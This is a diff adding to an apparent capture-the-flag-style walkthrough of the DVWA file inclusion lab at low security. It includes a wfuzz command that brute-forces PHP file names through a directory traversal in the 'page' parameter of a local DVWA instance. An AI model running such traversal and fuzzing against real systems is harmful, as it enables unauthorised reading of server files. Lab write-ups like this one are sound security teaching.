@@ -110,6 +110,21 @@ Notice that we are in the `/vulnerabilities/fi/` directory and requesting the `i
 
 ![](low_dir_traversal.png)
 
+![](low_3_5_quotes.png)
+
+![](low_4_5_quotes.png)
+
+Note that we should use the include function, i.e., pass our directory traversal attack as a value to the `page` parameter:
+
+![](without_include.png)
+
+We are missing one quote, so we can try searching for `.php` file via dir-busting ([command explanation](https://youtu.be/KY58WcX7OZ4?t=541)):
+
+```shell
+# searching for '.php' file in the '/hackable/flags' directory
+wfuzz -c --hh 3152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "PHPSESSID=m4ac6f2g7uig8aec7hgc8787kc; security=low" -u "http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
+```
+
 ## Security: Medium
 
 > _The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough._
